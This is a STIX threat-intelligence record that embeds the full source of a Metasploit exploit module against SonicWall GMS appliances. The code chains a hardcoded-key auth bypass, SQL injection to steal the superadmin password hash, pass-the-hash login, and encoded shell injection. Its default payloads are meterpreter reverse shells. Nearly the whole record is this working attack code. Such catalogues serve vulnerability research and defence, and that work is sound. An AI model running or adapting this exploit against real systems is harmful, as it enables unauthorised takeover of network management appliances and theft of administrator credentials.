{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8282a0f9-47e7-4395-b239-0e8ed0f23531",
    "created": "2024-08-14T17:11:42.332682Z",
    "modified": "2024-08-14T17:11:42.332686Z",
    "name": "Sonicwall",
    "description": " This module exploits a series of vulnerabilities - including auth bypass, SQL injection, and shell injection - to obtain remote code execution on SonicWall GMS versions <= 9.9.9320.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/sonicwall_shell_injection_cve_2023_34124.rb",
            "external_id": "sonicwall_shell_injection_cve_2023_34124.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2023/07/13/etr-sonicwall-recommends-urgent-patching-for-gms-and-analytics-cves/"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-34124"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-34133"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-34132"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-34127"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html\n\n  # We can actually use the title to identify which platform we're on\n  TITLE_WINDOWS = 'SonicWall Universal Management Host'\n  TITLE_LINUX = 'SonicWall Universal Management Appliance'\n\n  # Secret key (from com.sonicwall.ws.servlet.auth.MSWAuthenticator)\n  SECRET_KEY = '?~!@#$%^^()'\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Sonicwall',\n        'Description' => %q{\n          This module exploits a series of vulnerabilities - including auth\n          bypass, SQL injection, and shell injection - to obtain remote code\n          execution on SonicWall GMS versions <= 9.9.9320.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'fulmetalpackets <fulmetalpackets@gmail.com>', # MSF module, analysis\n          'Ron Bowes <rbowes@rapid7.com>' # MSF module, original PoC, analysis\n        ],\n        'References' => [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2023/07/13/etr-sonicwall-recommends-urgent-patching-for-gms-and-analytics-cves/'],\n          [ 'CVE', '2023-34124'],\n          [ 'CVE', '2023-34133'],\n          [ 'CVE', '2023-34132'],\n          [ 'CVE', '2023-34127']\n        ],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Linux Dropper',\n            {\n              'Platform' => ['linux'],\n              'Arch' => [ARCH_X64],\n              'Type' => :dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n                'WritableDir' => '/tmp'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => ['win'],\n              'Arch' => [ARCH_CMD],\n              'Type' => :cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/http/x64/meterpreter/reverse_tcp',\n                'WritableDir' => '%TEMP%'\n              }\n            }\n          ],\n          [\n            'Linux Command',\n            {\n              'Platform' => ['linux', 'unix'],\n              'Arch' => [ARCH_CMD],\n              'Type' => :cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/generic'\n              }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n\n        'DisclosureDate' => '2023-07-12',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        },\n        'DefaultOptions' => {\n          'SSL' => true,\n          'RPORT' => '443'\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The root URI of the Sonicwall appliance', '/']),\n      ]\n    )\n\n    register_advanced_options([\n      # This varies by target, so don't define the default here\n      OptString.new('WritableDir', [true, 'A directory where we can write files']),\n    ])\n  end\n\n  def check\n    vprint_status(\"Validating SonicWall GMS is running on URI: #{target_uri.path}\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'GET'\n    )\n\n    # Basic sanity checks - the path should return a HTTP/200\n    return CheckCode::Unknown('Could not connect to web service - no response') if res.nil?\n    return CheckCode::Unknown(\"Check URI Path, unexpected HTTP response code: #{res.code}\") if res.code != 200\n\n    # Ensure we're hitting plausible software\n    return CheckCode::Detected(\"Running: #{::Regexp.last_match(1)}\") if res.body =~ /(SonicWall Universal Management Suite [^<]+)</\n\n    # Otherwise, probably safe?\n    CheckCode::Safe('Does not appear to be running SonicWall GMS')\n  end\n\n  # Exploits CVE-2023-34133 (SQL injection) + CVE-2023-34124 (auth bypass) to\n  # get a password hash\n  def get_password_hash\n    # attempt a sqli.\n    vprint_status('Attempting to use SQL injection to grab the password hash for the superadmin user...')\n\n    # SQL injection question to fetch the admin password\n    query = \"' union select \" +\n\n            # This must be a valid DOMAIN, which we can thankfully fetch from the DB\n            '(select ID from SGMSDB.DOMAINS limit 1), ' +\n\n            # These fields don't matter\n            \"'', '', '', '', '', \" +\n\n            # This field is returned, so use it to get the id and password for our\n            # the super user, if possible\n            \"(select concat(id, ':', password) from sgmsdb.users where active = '1' order by issuperadmin desc limit 1 offset 0),\" +\n\n            # The rest of the fields don't matter, end with a single quote to finish with a clean query\n            \"'', '', '\"\n    vprint_status(\"Generated SQL injection: #{query}\")\n\n    # We need to sign our query with the SECRET_KEY\n    token = Base64.strict_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.const_get('SHA1').new, SECRET_KEY, query))\n    vprint_status(\"Generated a token using built-in secret key: #{token}\")\n\n    # Build the URI\n    # Note that encoding space to '+' doesn't work, so we replace it with '%20'\n    uri = normalize_uri(target_uri.path, 'ws/msw/tenant', CGI.escape(query).gsub(/\\+/, '%20'))\n\n    # Do it!\n    print_status('Sending SQL injection request to get the username/hash...')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => uri,\n      'headers' => {\n        'Auth' => '{\"user\": \"system\", \"hash\": \"' + token + '\"}'\n      }\n    )\n\n    # Sanity checks\n    fail_with(Failure::Unreachable, 'Could not connect to web service - no response') if res.nil?\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP response code: #{res.code}\") if res.code != 200\n    fail_with(Failure::UnexpectedReply, \"Service didn't return a JSON response\") if res.get_json_document.empty?\n\n    # This field has the SQL injection response\n    hash = res.get_json_document['alias']\n\n    # If the server responds with an error, it has no 'alias' field so the key\n    # is missing entirely (this is where it fails against patched targets)\n    fail_with(Failure::NotVulnerable, \"SQL injection failed - service probably isn't vulnerable (or isn't configured)\") if hash.nil?\n\n    # If alias is present but contains nothing, that means our query got no\n    # results (probably there are no active users, or something?)\n    fail_with(Failure::UnexpectedReply, 'SQL injection appeared to work, but no users returned - server might not have an admin account?') if hash.empty?\n\n    # If there's no ':' in the response, something super weird happened\n    fail_with(Failure::UnexpectedReply, 'SQL injection returned the wrong value: no username or hash') if !hash.include?(':')\n\n    username, hash = hash.split(/:/, 2)\n    print_good(\"Found an account: #{username}:#{hash}\")\n\n    [username, hash]\n  end\n\n  # Exploits CVE-2023-34132 (pass the hash)\n  def authenticate(username, hash)\n    # Grab server hashing token\n    vprint_status('Grabbing server hashing token...')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/appliance/login'),\n      'keep_cookies' => true\n    )\n    fail_with(Failure::Unreachable, 'Could not connect to web service - no response') if res.nil?\n\n    # Look for the getPwdHash function call, as it contains the token we need\n    if res.body.match(/getPwdHash.*,'([0-9]+)'/).nil?\n      fail_with(Failure::UnexpectedReply, 'Could not get the server token for authentication')\n    end\n\n    server_token = ::Regexp.last_match(1)\n    vprint_status(\"Got the server-side token: #{server_token}\")\n\n    # Generate the client_hash by combining the server token + the stolen\n    # password hash\n    client_hash = Digest::MD5.hexdigest(server_token + hash)\n    vprint_status(\"Generated client token: #{client_hash}\")\n\n    # Send the token\n    print_status('Attempting to authenticate with the client token + password hash...')\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/appliance/applianceMainPage'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'action' => 'login',\n        'clientHash' => client_hash,\n        'applianceUser' => username\n      }\n    })\n\n    fail_with(Failure::Unreachable, 'Could not connect to web service - no response') if res.nil?\n\n    # Check the title to make sure it worked\n    html = res.get_html_document\n    title = html.at('title').text\n\n    # We can identify the platform based on the title\n    if title == TITLE_LINUX\n      print_good(\"Successfully logged in as #{username} (Linux detected!)\")\n      return Msf::Module::Platform::Linux\n    elsif title == TITLE_WINDOWS\n      print_good(\"Successfully logged in as #{username} (Windows detected!)\")\n      return Msf::Module::Platform::Windows\n    end\n\n    fail_with(Failure::UnexpectedReply, \"Authentication appears to have failed! Title was \\\"#{title}\\\", which is not recognized as successful\")\n  end\n\n  def execute_command_windows(cmd)\n    vprint_status(\"Encoding (Windows) command: #{cmd}\")\n\n    # While this is a shell command injection issue, an aggressive XSS filter\n    # prevents us from using a lot of important characters such as quotes and\n    # plus and ampersands and stuff. We can't even use Base64, because we can't\n    # use the + sign!\n    #\n    # We discovered that we could encode the command as integers, then use\n    # powershell to decode + execute it, so that's what this does.\n    cmd = \"cmd.exe /c #{Msf::Post::Windows.escape_powershell_literal(cmd).gsub(/&/, '\"&\"')}\"\n    encoded_cmd = \"powershell IEX ([System.Text.Encoding]::UTF8.GetString([byte[]]@(#{cmd.bytes.join(',')})))\"\n\n    # Run the command\n    vprint_status(\"Running shell command: #{cmd}\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/appliance/applianceMainPage'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'action' => 'file_system',\n        'task' => 'search',\n        'searchFolder' => 'C:\\\\GMSVP\\\\etc\\\\',\n        'searchFilter' => \"|#{encoded_cmd}| rem \"\n      }\n    })\n\n    # This doesn't work, because our payload blocks and it eventually fails\n    fail_with(Failure::Unreachable, 'No response to command execution') if res.nil? || res.body.empty?\n    fail_with(Failure::UnexpectedReply, 'The server rejected our command due to filtering (the service has very aggressive XSS filtering, which blocks a lot of shell commands)') if res.body.include?('invalid contents found')\n\n    print_good('Payload sent!')\n  end\n\n  def execute_command_linux(cmd)\n    vprint_status('Encoding (Linux) payload')\n\n    # Generate a filename\n    payload_file = File.join(datastore['WritableDir'], \".#{Rex::Text.rand_text_alpha_lower(8)}\")\n\n    # Wrap the command so we can execute arbitrary commands. There are several\n    # difficulties here, the first of which is that we don't have much in the\n    # way of tools. We're missing curl, wget, base64, python, ruby, even perl!\n    # The best tool I could find for staging a payload is uudecode, so we use\n    # that. (I noticed later that telnet exists, which could be another option)\n    #\n    # The good news is, with uudecode, we can send a base64 payload. The bad\n    # news is, we can't use '+', which means we can't use pure base64! To work\n    # around that, we replace '+' with '@', then use a bit of Bash magic to\n    # put it back! We also can't use quotes, so we have to do a mountain of\n    # escaping instead. The default shell is also /bin/sh, so we need to run\n    # bash explicitly for the `$()` substitutions to work.\n    cmd = [\n      # Build a command that runs in bash (but don't use quotes!)\n      'bash -c ',\n\n      # Escape all this for bash\n      Shellwords.escape([\n        # Use `uudecode` to get a '+' into a variable\n        \"PLUS=$(echo -e begin-base64\\ 755\\ a\\\\\\\\nKwee\\\\\\\\n==== | uudecode -o-);\",\n\n        # Build a new uuencode file (encoded in base64) with the payload\n        \"echo -e begin-base64 755 #{Shellwords.escape(payload_file)}\\\\\\\\n\",\n\n        # Encode the payload as base64, but replace + with a variable\n        \"#{Base64.strict_encode64(cmd).gsub(/\\+/, '${PLUS}')}\\\\\\\\n\",\n\n        # Pipe into uudecode\n        '==== | uudecode;',\n\n        # Run in the background with coproc\n        \"coproc #{Shellwords.escape(payload_file)};\",\n\n        # Delete the payload file\n        \"rm #{payload_file}\"\n      ].join)\n    ].join\n\n    # Run it!\n    vprint_status(\"Encoded shell command: #{cmd}\")\n    print_status('Attempting to execute the shell injection payload')\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/appliance/applianceMainPage'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'action' => 'file_system',\n        'task' => 'search',\n        'searchFolder' => '/opt/GMSVP/etc/',\n        'searchFilter' => \";#{cmd}#\"\n      }\n    })\n\n    # This doesn't work, because our payload blocks and it eventually fails\n    fail_with(Failure::Unreachable, 'No response to command execution') if res.nil? || res.body.empty?\n    fail_with(Failure::UnexpectedReply, 'The server rejected our command due to filtering (the service has very aggressive XSS filtering, which blocks a lot of shell commands)') if res.body.include?('invalid contents found')\n\n    print_good('Payload sent!')\n  end\n\n  def exploit\n    # Get the password hash (from SQL injection + auth bypass)\n    username, hash = get_password_hash\n\n    # Use pass-the-hash to log in using that hash\n    detected_platform = authenticate(username, hash)\n\n    # Sanity-check the target\n    if !datastore['ForceExploit'] && !target.platform.platforms.include?(detected_platform)\n      fail_with(Failure::BadConfig, \"The host appears to be #{detected_platform}, which the target #{target.name} does not support; please choose the appropriate target (or set ForceExploit to true)\")\n    end\n\n    # Generate a payload based on the target type\n    case target['Type']\n    when :cmd\n      my_payload = payload.encoded\n    when :dropper\n      my_payload = generate_payload_exe\n    else\n      fail_with(Failure::BadConfig, \"Unknown target type: #{target.type}\")\n    end\n\n    # Run a command, using the platform specified in the target\n    if target.platform.platforms.include?(Msf::Module::Platform::Linux)\n      execute_command_linux(my_payload)\n    elsif target.platform.platforms.include?(Msf::Module::Platform::Windows)\n      execute_command_windows(my_payload)\n    else\n      fail_with(Failure::Unknown, \"Unknown platform: #{platform}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-07-12",
    "x_mitre_platforms": [
        "['linux', 'unix']"
    ]
}